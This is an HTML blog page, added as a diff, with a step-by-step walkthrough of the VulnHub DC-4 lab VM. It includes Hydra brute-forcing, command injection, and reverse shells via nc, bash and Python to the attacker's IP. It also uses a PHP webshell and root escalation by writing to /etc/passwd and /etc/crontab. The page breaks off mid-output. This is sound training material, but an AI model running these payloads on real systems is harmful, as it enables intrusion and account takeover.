@@ -1,0 +1,554 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>DC：4 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DC：4">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-11 00:00" pubdate>
+        2022年7月11日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      61
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC：4</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x07-DC-4-vulnhub"><a href="#0x07-DC-4-vulnhub" class="headerlink" title="0x07 DC: 4~vulnhub"></a>0x07 DC: 4~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">DC: 4 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.159</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.159</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.159</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-10 20:03 EDT<br>Nmap scan report for 192.168.135.159<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)<br>|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)<br>|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)<br>80/tcp open  http    nginx 1.15.10<br>|_http-server-header: nginx/1.15.10<br>|_http-title: System Tools<br>MAC Address: 00:0C:29:A2:63:02 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>nginx 1.15.10</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.159  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.159</span><br><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.159</span>                                                              <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br>Output File: /home/kali/.dirsearch/reports/192.168.135.159/_22-07-10_20-11-36.txt<br>Error Log: /home/kali/.dirsearch/logs/errors-22-07-10_20-11-36.log<br>Target: http://192.168.135.159/<br><br>[20:11:36] Starting: <br>[20:12:49] 302 -  704B  - /command.php  -&gt;  index.php                       <br>[20:12:56] 301 -  170B  - /css  -&gt;  http://192.168.135.159/css/             <br>[20:13:20] 301 -  170B  - /images  -&gt;  http://192.168.135.159/images/       <br>[20:13:20] 403 -  556B  - /images/                                          <br>[20:13:21] 200 -  506B  - /index.php                                        <br>[20:13:22] 403 -   15B  - /index.pHp                                        <br>[20:13:32] 302 -  206B  - /login.php  -&gt;  index.php                         <br>[20:13:33] 302 -  163B  - /logout.php  -&gt;  index.php                        <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>
+<p>查看，发现是个登录页，尝试爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.135.159 http-form-post <span class="hljs-string">&#x27;/login.php:username=^USER^&amp;password=^PASS^:S=logout&#x27;</span></span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 20:37:28<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.135.159:80/login.php:username=^USER^&amp;password=^PASS^:S=logout<br>[80][http-post-form] host: 192.168.135.159   login: admin   password: happy<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 20:37:53<br></code></pre></td></tr></table></figure>
+<p>得到：<code>login: admin   password: happy</code> ，登陆，看到有个 <code>Command</code> ，进去后发现可以执行命令，不过只能执行特定的命令。</p>
+<blockquote>
+<p>可能需要登录两次，不知为何第一次登陆后只是刷新了页面</p>
+</blockquote>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>使用 burp 抓包，Send to Repeater：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /command.php HTTP/1.1<br>Host: 192.168.135.159<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 22<br>Origin: http://192.168.135.159<br>Connection: close<br>Referer: http://192.168.135.159/command.php<br>Cookie: PHPSESSID=cetjo47ie8r15re8h7qr32la17<br>Upgrade-Insecure-Requests: 1<br><br>radio=ls+-l&amp;submit=Run<br></code></pre></td></tr></table></figure>
+<p>修改 POST 数据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=whoami&amp;submit=Run<br></code></pre></td></tr></table></figure>
+<p>send，成功执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">You have selected: whoami&lt;br /&gt;<br>&lt;pre&gt;<br>www-data<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure>
+<p>再次修改，反弹 shell，经过测试，bash、python 反弹都未成功，写一句话木马也没成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1&amp;submit=Run<br>radio=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&amp;submit=Run<br>radio=echo &quot;&lt;?php $wzz=$_GET[&#x27;wzz&#x27;]; echo `$wzz`; ?&gt;&quot; &gt; shell.php&amp;submit=Run<br></code></pre></td></tr></table></figure>
+<p>nc 成功反弹：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">radio=nc -e /bin/sh 192.168.135.141 4444&amp;submit=Run<br></code></pre></td></tr></table></figure>
+<p>kali 监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                                    <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.159] 59456<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-4:/usr/share/nginx/html$ <br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>在 jim 用户目录下发现一些旧密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-4:/usr/share/nginx/html$ ls /home<br>ls /home<br>charles  jim  sam<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/charles<br>ls -l /home/charles<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/sam<br>ls -l /home/sam<br>total 0<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim    <br>ls -l /home/jim<br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw------- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br>www-data@dc-4:/usr/share/nginx/html$ ls -l /home/jim/backups<br>ls -l /home/jim/backups<br>total 4<br>-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak<br>www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/backups/old-passwords.bak<br>cat /home/jim/backups/old-passwords.bak<br>000000<br>12345<br>iloveyou<br>[......]<br></code></pre></td></tr></table></figure>
+<p>hydra 爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l jim -P passwd.txt 192.168.135.159 ssh</span><br>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 23:29:09<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task<br>[DATA] attacking ssh://192.168.135.159:22/<br>[STATUS] 179.00 tries/min, 179 tries in 00:01h, 76 to do in 00:01h, 16 active<br>[22][ssh] host: 192.168.135.159   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 23:30:43<br></code></pre></td></tr></table></figure>
+<p>得到 <code>login: jim   password: jibril04</code> ，登录 SSH：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh jim@192.168.135.159</span><br>jim@192.168.135.159&#x27;s password: <br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100<br>jim@dc-4:/$<br></code></pre></td></tr></table></figure>
+<p>看到有个邮件，查找邮件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:/$ find / -name mail 2&gt;/dev/null<br>/usr/bin/mail<br>/etc/alternatives/mail<br>/var/mail<br>/var/spool/mail<br>jim@dc-4:/$ ls -l /var/mail<br>total 8<br>-rw-rw---- 1 jim      mail  715 Apr  6  2019 jim<br>-rw-rw---- 1 www-data mail 1776 Jul 11 11:56 www-data<br>jim@dc-4:/$ cat /var/mail/jim<br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=&quot;UTF-8&quot;<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O<br>Hi Jim,<br>I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.<br>Password is:  ^xHhA&amp;hvim0y<br>See ya,<br>Charles<br></code></pre></td></tr></table></figure>
+<p> 得到 <code>Charles</code> 用户密码：<code>^xHhA&amp;hvim0y</code> ，切换到 <code>Charles</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">jim@dc-4:~$ su charles<br>Password: <br>charles@dc-4:/home/jim$ <br></code></pre></td></tr></table></figure>
+<p>查看 sudo：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ sudo -l<br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br></code></pre></td></tr></table></figure>
+<p>发现可以无密码运行 teehee</p>
+<p><strong>方法一：创建一个 root 权限用户，用 teehee 往 /etc/passwd 里添加一个 root 权限用户</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;test::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd<br>test::0:0:::/bin/bash<br>charles@dc-4:/home/jim$ su test<br>root@dc-4:/home/jim# whoami<br>root<br>root@dc-4:/home/jim# ls /root<br>flag.txt<br>root@dc-4:/home/jim# cat /root/flag.txt<br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 <br>888  d8b  888          888 888      888    888                            888 888 888 888 <br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 <br>888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  <br>888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure>
+<p><strong>方法二：创建一个定时任务，给 /bin/sh 赋予 SUID 权限，用 teehee 把定时任务写到定时任务文件 /etc/crontab</strong></p>
+<blockquote>
+<p>bash 不可以，sh 可以</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">charles@dc-4:/home/jim$ echo &quot;* * * * * root chmod u+s /bin/bash&quot; | sudo teehee -a /etc/crontab<br>* * * * * root chmod 4777 /bin/bash<br>charles@dc-4:/home/jim$ cat /etc/crontab<br><span class="hljs-meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span><br><span class="hljs-meta">#</span><span class="bash"> Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta">#</span><span class="bash"> and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta">#</span><span class="bash"> that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / 